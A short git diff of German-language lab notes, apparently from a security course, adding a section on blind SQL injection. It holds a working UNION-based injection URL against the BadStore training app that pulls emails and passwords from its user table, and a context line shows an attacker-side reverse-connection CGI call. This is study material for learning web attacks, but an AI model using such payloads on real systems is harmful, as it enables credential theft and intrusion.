@@ -153,3 +153,9 @@ Beim Angreifer: `http://192.168.178.93/bash/connectme.cgi?ip=192.168.178.21&port
 
 ### 6.1.4.2 - 2.php
 Weil er Prepared Statements genutzt hat
+
+## 6.1.4.3 - Blind injections
+### So viele SQL Injections wie möglich finden
+```SQL
+http://192.168.178.119/cgi-bin/badstore.cgi?searchquery=xx%27+IN+(itemnum,sdesc,ldesc)+union+select+email,passwd,null,null+from+userdb+LIMIT+2+--+&action=search&x=16&y=7
+```
